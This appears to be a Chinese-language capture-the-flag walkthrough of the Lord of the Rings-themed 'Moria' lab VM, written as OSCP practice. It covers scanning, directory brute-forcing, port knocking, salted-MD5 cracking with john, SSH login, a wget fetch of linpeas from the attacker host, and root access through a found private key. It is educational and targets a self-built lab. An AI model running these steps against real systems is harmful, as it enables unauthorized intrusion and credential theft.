## 简介

该项目是abatchy作者参考指环王电影搭建的项目环境，目标是获取最底层的flag.txt文本信息，但是作者提示不需要指环王知识，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。接下来不管是零基础学习渗透者，还是有些基础的渗透者，甚至是高水平的渗透人员读该文章都能学习到一些红队的技巧和知识。

该项目有始有终会用到信息收集->目录爆破->流量抓取分析->ASCII解码->FTP信息枚举->暴力破解->内部信息收集->提权，最终拿到flag.txt的过程，那么在五大模块中用到了一些小技巧都会在文章中演示出来，希望大家能动手也来和我一起学习渗透。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 一、信息收集

信息收集非常重要，有了信息才能知道下一步该如何进行，接下来将用nmap来演示信息收集：

### 1、nmap网段枚举

由于本项目环境是nat模式需要项目IP地址，扫描挖掘本地的IP地址信息：  
![1649417718_62501df6249cb9f5b8b54.png!small?1649417724009](https://image.3001.net/images/20220408/1649417718_62501df6249cb9f5b8b54.png!small?1649417724009)  
发现本kali ip为253段！用253段进行全网段扫描：  
![1649417720_62501df8a4c007e1ad604.png!small?1649417724010](https://image.3001.net/images/20220408/1649417720_62501df8a4c007e1ad604.png!small?1649417724010)

    
    
    nmap 192.168.253.0/24 -sP
    

发现项目IP为215！

### 2、nmap全端口服务枚举

进行namp全端口服务枚举：

    
    
    nmap 192.168.253.215 -p- -A
    

![1649417729_62501e010652046c900a8.png!small?1649417744630](https://image.3001.net/images/20220408/1649417729_62501e010652046c900a8.png!small?1649417744630)

    
    
    21/tcp open  ftp     vsftpd 2.0.8 or later
    22/tcp open  ssh     OpenSSH 6.6.1 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
    

发现开启了21、22、80端口，初步进行web信息收集！

## 3、web（80）端口信息枚举

访问web页面：  
![1649417735_62501e07dc24f952f108b.png!small?1649417747613](https://image.3001.net/images/20220408/1649417735_62501e07dc24f952f108b.png!small?1649417747613)

    
    
    Eere'is written in the Feanorian characters according to the mode of beleriand：Ennyn Duria Aoon Moria：peoo mellon aminno.JM 12 arvi hainech-ant：Celebrimboro Eregion teithantithiwhin
    

图像显示的是魔戒，这是《指环王》电影中的矮人城市，打开门有一个谜！  
可以看到有Moria，谷歌的翻译是说：Mellon必须是密码之一！

## 二、信息爆破

### 1、目录爆破

用dirb对web目录进行爆破：  
![1649417742_62501e0eb5bfc859c8009.png!small?1649417749134](https://image.3001.net/images/20220408/1649417742_62501e0eb5bfc859c8009.png!small?1649417749134)

    
    
    dirb http://192.168.253.215/
    
    ==> DIRECTORY: http://192.168.253.215/w/
    

发现w目录信息，深入枚举！

### 2、爆破目录信息枚举

![1649417747_62501e13cf6db862ce3ce.png!small?1649417749134](https://image.3001.net/images/20220408/1649417747_62501e13cf6db862ce3ce.png!small?1649417749134)

    
    
    http://192.168.253.215/w/
    

存在多级目录环境：  
![1649417757_62501e1d72613c226a6cf.png!small?1649417760697](https://image.3001.net/images/20220408/1649417757_62501e1d72613c226a6cf.png!small?1649417760697)

    
    
    http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/
    

通过信息枚举发现存在多行回显信息：  
![1649417757_62501e1d4a74762c04e34.png!small?1649417760697](https://image.3001.net/images/20220408/1649417757_62501e1d4a74762c04e34.png!small?1649417760697)

    
    
    1. Balin: "Be quiet, the Balrog will hear you!" 
    2. Nain:"Will the human get the message?" 
    3. "Knock knock" 
    4. Dain:"Is that human deaf? Why is it not listening?" 
    5. "We will die here.." 
    6. Ori:"Will anyone hear us?" 
    7. Fundin:"That human will never save us!" 
    8. Oin:"Stop knocking!" 
    

一些人名对话，提示到knocking，这是端口敲震？继续进行信息枚举操作。

### 3、目录文件模糊爆破

继续用dirb -X功能对目录文件进行爆破：  
![1649417881_62501e99f0d1ddcf34864.png!small?1649417890340](https://image.3001.net/images/20220408/1649417881_62501e99f0d1ddcf34864.png!small?1649417890340)

    
    
    dirb http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/ -X .txt .img .html
    

发现文本信息：random.txt  
访问查看：  
![1649417888_62501ea040af8b6011bab.png!small?1649417890340](https://image.3001.net/images/20220408/1649417888_62501ea040af8b6011bab.png!small?1649417890340)

    
    
    http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/random.txt
    
    Balin: "Be quiet, the Balrog will hear you!"
    Oin:"Stop knocking!"
    Ori:"Will anyone hear us?"
    Fundin:"That human will never save us!"
    Nain:"Will the human get the message?"
    "Eru! Save us!"
    "We will die here.."
    "Is this the end?"
    "Knock knock"
    "Too loud!"
    Maeglin:"The Balrog is not around, hurry!"
    Telchar to Thrain:"That human is slow, don't give up yet"
    Dain:"Is that human deaf? Why is it not listening?"
    

该文本信息就是前面url刷新随机出现的文本信息，发现用户信息：

    
    
    Balin，Oin，Ori，Fundin，Nain，Eru，Balrog
    

当前页面存在端口碰撞？去抓接口流量测试看看！

## 三、流量分析

### 1、流量抓包分析-Wireshark

我使用Wireshark抓包，先开启Wireshark，监听本地eth0接口：  
![1649417894_62501ea622ff5637dcf04.png!small?1649417896204](https://image.3001.net/images/20220408/1649417894_62501ea622ff5637dcf04.png!small?1649417896204)

这时候多刷新几次页面，就发现存在1337端口去访问对象项目的多个端口情况，这时候使用命令进行过滤：

    
    
    tcp.srcport == 1337
    

![1649417902_62501eaec32640bcbb125.png!small?1649417905343](https://image.3001.net/images/20220408/1649417902_62501eaec32640bcbb125.png!small?1649417905343)  
可看到1337去访问顺序为：77 101 108 108 111 110 54 57的端口情况，这边我将77 101 108 108 111 110 54
57端口按顺序进行敲震！

### 2、端口敲震测试

通过Wireshark流量接口抓包分析发现存在1337端口敲震，进行测试：  
![1649417911_62501eb740a6902371f90.png!small?1649417914848](https://image.3001.net/images/20220408/1649417911_62501eb740a6902371f90.png!small?1649417914848)

    
    
    knock -v 192.168.253.215 77 101 108 108 111 110 54 57
    

可看到端口敲震完毕namp枚举后没有开启任何端口情况！

## 四、密码学解码

### ASCII解码

最后经过很久的研究，发现这是十进制数值需要进行ASCII解码：  
![1649417920_62501ec035066242d6048.png!small?1649417931016](https://image.3001.net/images/20220408/1649417920_62501ec035066242d6048.png!small?1649417931016)  
通过对ASCII表进行翻译，发现：

    
    
    Mellon69
    

在访问http://192.168.253.215/w/h/i/s/p/e/r/the_abyss/random.txt，提示：  
The Balrog is not around, hurry有这一句，让我们别吵，Balrog会听到我们的声音！猜测用户是Balrog！

## 五、FTP+静态页面信息枚举

### 1、FTP信息枚举

登录FTP：

    
    
    ftp 192.168.253.215
    Balrog
    Mellon69
    

提示：230 Login successful.  
成功登录，尝试枚举站目录信息：  
![1649417927_62501ec76c8ded0d612d3.png!small?1649417937065](https://image.3001.net/images/20220408/1649417927_62501ec76c8ded0d612d3.png!small?1649417937065)  
发现存在一个复杂的目录：

    
    
    QlVraKW4fbIkXau9zkAPNGzviT3UKntl
    

查看目录信息：  
![1649417932_62501ecc6888782ffd892.png!small?1649417938803](https://image.3001.net/images/20220408/1649417932_62501ecc6888782ffd892.png!small?1649417938803)  
发现存在index.php可以访问！

访问页面：

    
    
    http://192.168.253.215/QlVraKW4fbIkXau9zkAPNGzviT3UKntl/
    

![1649417936_62501ed0d2bba68f78c7c.png!small?1649417938803](https://image.3001.net/images/20220408/1649417936_62501ed0d2bba68f78c7c.png!small?1649417938803)  
发现存在九个用户和密码值信息，查看下是什么类型的密码：

    
    
    hash-identifier
    

![1649417942_62501ed66425479b4e3ea.png!small?1649417953369](https://image.3001.net/images/20220408/1649417942_62501ed66425479b4e3ea.png!small?1649417953369)  
通过hash-identifier查看到该密匙是MD5加密信息！进行暴力破解！

### 2、静态页面枚举

通过访问静态页面源码发现信息：  
![1649417949_62501edde4ca88cc74cd8.png!small?1649417966863](https://image.3001.net/images/20220408/1649417949_62501edde4ca88cc74cd8.png!small?1649417966863)

    
    
    6MAp84
    bQkChe
    HnqeN4
    e5ad5s
    g9Wxv7
    HCCsxP
    cC5nTr
    h8spZR
    tb9AWe
    
    MD5(MD5(Password).Salt)
    

发现该信息加了Salt（盐），那么接下来将详细介绍john爆破MD5+盐的过程。

## 六、暴力破解盐

### 暴力破解-John

众所周知，John the Ripper和Hashcat能够破解使用各种密码哈算法生成的哈希值。其中，John the
Ripper支持的哈希值类型列表，可以通过下面的命令进行查看：

    
    
    john --list=subformats
    

![1649417957_62501ee5ed7c7547d7b29.png!small?1649417967747](https://image.3001.net/images/20220408/1649417957_62501ee5ed7c7547d7b29.png!small?1649417967747)  
那么该处对应静态源码发现的：类型6

    
    
    MD5(MD5(Password).Salt)
    type = dynamic_6: md5(md5($p).$s)
    

那么这时候可以使用john类型6去暴力破解，在此先来熟悉该类型怎么读懂！

哈希算法的类型可以分为以下几组：

    
    
    1. 原始算法(md2, md4, md5, sha.....）
    2. 加盐算法。这种类型的算法基于原始哈希算法，但会向密码字符串中加入盐，例如：md5($pass.$salt)
    3. 迭代算法。这种类型的算法也是基于原始哈希算法，但哈希算法的结果会再次被哈希化，并且这种处理可能会发生多次。
    

**重点：**哈希值和盐是用美元符号（$）分隔开来的！

那么读懂md5(md5($p).$s)：

    
    
    变量$p或$pass表示候选密码。
    变量$s或$salt用作“盐”常量。
    

那么接下来进行暴力破解只需要将MD5和盐进行$分隔保存到文本：  
![1649417963_62501eeb2b632fc8f7733.png!small?1649417967747](https://image.3001.net/images/20220408/1649417963_62501eeb2b632fc8f7733.png!small?1649417967747)  
通过$分隔后，用以下命令进行爆破：

    
    
    john --form=dynamic_6 --wordlist=/root/Desktop/rockyou.txt hash
    
    或者以详细类型进行爆破：
    john --form=dynamic='md5(md5($p).$s)' --wordlist=/root/Desktop/rockyou.txt hash
    

![1649417974_62501ef6896c0195b0868.png!small?1649417978047](https://image.3001.net/images/20220408/1649417974_62501ef6896c0195b0868.png!small?1649417978047)  
逐一对应：

    
    
    Balin:flower
    Oin:rainbow
    Ori:spanky
    Maeglin:fuckoff
    Fundin:hunter2
    Nain:warrior
    Dain:abcdef
    Thrain:darkness
    Telchar:magic
    

通过测试发现ssh用户密码为Ori:spanky！

## 七、内部信息枚举

ssh登录：

    
    
    ssh Ori@192.168.253.215
    spanky
    

![1649417982_62501efe3a99cebfd38a0.png!small?1649417983224](https://image.3001.net/images/20220408/1649417982_62501efe3a99cebfd38a0.png!small?1649417983224)

登录成功后，上传枚举脚本：linpeas

    
    
    python -m SimpleHTTPServer 8081
    wget http://192.168.253.138:8081/linpeas.sh
    chmod +x linpeas.sh
    

![1649417990_62501f061f4642de3f25c.png!small?1649418004951](https://image.3001.net/images/20220408/1649417990_62501f061f4642de3f25c.png!small?1649418004951)

执行脚本进行信息枚举：

    
    
    ./linpeas.sh
    

![1649417992_62501f08db6beb9d6213e.png!small?1649418004951](https://image.3001.net/images/20220408/1649417992_62501f08db6beb9d6213e.png!small?1649418004951)

    
    
    Possible private SSH keys were found!
    /home/Ori/.ssh/id_rsa
    

发现存在ssh key信息！其他没有任何有用的信息了！

## 八、提权

通过linpeas信息枚举发现该用户存在rsa秘钥，前往进行详细查看，访问/home/Ori/.ssh/目录发现存在私钥 (id_rsa) 与公钥
(id_rsa.pub)：  
![1649418001_62501f11567c2b1fe6239.png!small?1649418004951](https://image.3001.net/images/20220408/1649418001_62501f11567c2b1fe6239.png!small?1649418004951)

通过信息枚举发现存在root用户，通过尝试利用该私钥登录root用户：

    
    
    cd /home/Ori/.ssh/
    ssh root@127.0.0.1 -i id_rsa
    

通过项目本地环境尝试使用私钥成功登录root用户，获得最高权限！

## 九、总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap信息枚举、dirb目录爆破、dirb文件类型爆破、Wireshark接口抓包、ASCII表手动解码、FTP信息枚举、静态页面枚举+john暴力破解MD5盐、linpeas信息枚举、ssh
rsa提权等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

希望大家提高安全意识，没有网络安全就没有国家安全！

